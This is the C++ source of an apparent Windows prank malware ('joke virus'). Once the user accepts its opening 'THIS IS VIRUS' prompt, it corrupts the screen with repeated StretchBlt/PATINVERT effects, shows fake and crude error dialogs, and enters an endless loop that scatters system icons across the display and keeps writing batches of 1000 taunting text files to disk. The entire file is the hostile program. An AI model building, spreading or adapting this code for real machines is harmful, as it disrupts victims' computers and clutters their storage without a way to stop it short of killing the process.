#include <Windows.h>
#include <iostream>
#include <fstream>
#include <string>

using namespace std;

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpszCmdLine, int nCmdShow)
{
	if (MessageBox(0, L"THIS IS VIRUS", L"THIS IS VIRUS", MB_YESNO) == IDYES)
	{
	
	}
	else
	{
		exit(0);
	}
	
	HDC hdc = GetDC(0);
	
	int x = GetSystemMetrics(0);
	int y = GetSystemMetrics(1);
	
	HINSTANCE icon = LoadLibrary(L"shell32.dll");
	HICON iconlol = LoadIcon(icon, MAKEINTRESOURCE(161));
	HICON iconlol1 = LoadIcon(icon, MAKEINTRESOURCE(28));
	HICON iconlol2 = LoadIcon(icon, MAKEINTRESOURCE(240));
	HICON iconlol3 = LoadIcon(icon, MAKEINTRESOURCE(200));
	HICON iconlol4 = LoadIcon(icon, MAKEINTRESOURCE(144));
	
	StretchBlt(hdc, 50, 50, x - 100, y - 100, hdc, 0, 0, x, y, MERGEPAINT);
	Sleep(1000);
	StretchBlt(hdc, 50, 50, x - 100, y - 100, hdc, 0, 0, x, y, MERGEPAINT);
	Sleep(900);
	StretchBlt(hdc, 50, 50, x - 100, y - 100, hdc, 0, 0, x, y, MERGEPAINT);
	Sleep(800);
	StretchBlt(hdc, 50, 50, x - 100, y - 100, hdc, 0, 0, x, y, MERGEPAINT);
	Sleep(700);
	StretchBlt(hdc, 50, 50, x - 100, y - 100, hdc, 0, 0, x, y, MERGEPAINT);
	Sleep(600);
	StretchBlt(hdc, 50, 50, x - 100, y - 100, hdc, 0, 0, x, y, MERGEPAINT);
	Sleep(500);
	StretchBlt(hdc, 50, 50, x - 100, y - 100, hdc, 0, 0, x, y, MERGEPAINT);
	Sleep(400);
	StretchBlt(hdc, 50, 50, x - 100, y - 100, hdc, 0, 0, x, y, MERGEPAINT);
	Sleep(300);
	StretchBlt(hdc, 50, 50, x - 100, y - 100, hdc, 0, 0, x, y, MERGEPAINT);
	Sleep(200);
	StretchBlt(hdc, 50, 50, x - 100, y - 100, hdc, 0, 0, x, y, MERGEPAINT);
	Sleep(100);
	StretchBlt(hdc, 50, 50, x - 100, y - 100, hdc, 0, 0, x, y, MERGEPAINT);
	StretchBlt(hdc, 50, 50, x - 100, y - 100, hdc, 0, 0, x, y, MERGEPAINT);
	StretchBlt(hdc, 50, 50, x - 100, y - 100, hdc, 0, 0, x, y, MERGEPAINT);
	StretchBlt(hdc, 50, 50, x - 100, y - 100, hdc, 0, 0, x, y, MERGEPAINT);
	StretchBlt(hdc, 50, 50, x - 100, y - 100, hdc, 0, 0, x, y, MERGEPAINT);
	StretchBlt(hdc, 50, 50, x - 100, y - 100, hdc, 0, 0, x, y, MERGEPAINT);
	MessageBox(0, L"No have user32.dll", L"Error to start", MB_OK);
	StretchBlt(hdc, 50, 50, x - 100, y - 100, hdc, 0, 0, x, y, PATINVERT);
	StretchBlt(hdc, 50, 50, x - 100, y - 100, hdc, 0, 0, x, y, PATINVERT);
	StretchBlt(hdc, 50, 50, x - 100, y - 100, hdc, 0, 0, x, y, PATINVERT);
	StretchBlt(hdc, 50, 50, x - 100, y - 100, hdc, 0, 0, x, y, PATINVERT);
	StretchBlt(hdc, 50, 50, x - 100, y - 100, hdc, 0, 0, x, y, PATINVERT);
	StretchBlt(hdc, 50, 50, x - 100, y - 100, hdc, 0, 0, x, y, PATINVERT);
	StretchBlt(hdc, 50, 50, x - 100, y - 100, hdc, 0, 0, x, y, PATINVERT);
	StretchBlt(hdc, 50, 50, x - 100, y - 100, hdc, 0, 0, x, y, PATINVERT);
	StretchBlt(hdc, 50, 50, x - 100, y - 100, hdc, 0, 0, x, y, PATINVERT);
	StretchBlt(hdc, 50, 50, x - 100, y - 100, hdc, 0, 0, x, y, PATINVERT);
	StretchBlt(hdc, 50, 50, x - 100, y - 100, hdc, 0, 0, x, y, PATINVERT);
	StretchBlt(hdc, 50, 50, x - 100, y - 100, hdc, 0, 0, x, y, PATINVERT);
	StretchBlt(hdc, 50, 50, x - 100, y - 100, hdc, 0, 0, x, y, PATINVERT);
	StretchBlt(hdc, 50, 50, x - 100, y - 100, hdc, 0, 0, x, y, PATINVERT);
	StretchBlt(hdc, 50, 50, x - 100, y - 100, hdc, 0, 0, x, y, PATINVERT);
	StretchBlt(hdc, 50, 50, x - 100, y - 100, hdc, 0, 0, x, y, PATINVERT);
	StretchBlt(hdc, 50, 50, x - 100, y - 100, hdc, 0, 0, x, y, PATINVERT);
	StretchBlt(hdc, 50, 50, x - 100, y - 100, hdc, 0, 0, x, y, PATINVERT);
	StretchBlt(hdc, 50, 50, x - 100, y - 100, hdc, 0, 0, x, y, PATINVERT);
	StretchBlt(hdc, 50, 50, x - 100, y - 100, hdc, 0, 0, x, y, PATINVERT);
	StretchBlt(hdc, 50, 50, x - 100, y - 100, hdc, 0, 0, x, y, PATINVERT);
	MessageBox(0, L"No have JOPA YOU PC.dll", L"No have JOPA YOU PC.dllNo have JOPA YOU PC.dllNo have JOPA YOU PC.dllNo have JOPA YOU PC.dll", MB_OK);
	
	while (true)
	{
		StretchBlt(hdc, 50, 50, x - 100, y - 100, hdc, 0, 0, x, y, SRCCOPY);
		StretchBlt(hdc, 50, 50, x - 100, y - 100, hdc, 0, 0, x, y, PATINVERT);
		DrawIcon(hdc, rand() % x, rand() % y, iconlol);
		DrawIcon(hdc, rand() % x, rand() % y, iconlol1);
		DrawIcon(hdc, rand() % x, rand() % y, iconlol2);
		DrawIcon(hdc, rand() % x, rand() % y, iconlol3);
		DrawIcon(hdc, rand() % x, rand() % y, iconlol4);
		BitBlt(hdc, 10, 10, x, y, hdc, 0, 0, SRCAND);
		for (int i = 0; i < 1000; i++)
		{
			string name = "ОТКРОЙ(письмо)" + to_string(i) + ".txt";
			ofstream f;
			f.open(name);
			f << "Proha Kartoha hack you pc!!! Proha Kartoha hack you pc!!! Proha Kartoha hack you pc!!! Proha Kartoha hack you pc!!! Proha Kartoha hack you pc!!! Proha Kartoha hack you pc!!! Proha Kartoha hack you pc!!! Proha Kartoha hack you pc!!!";
			f.close();
		}
		
		Sleep(0);
	}
}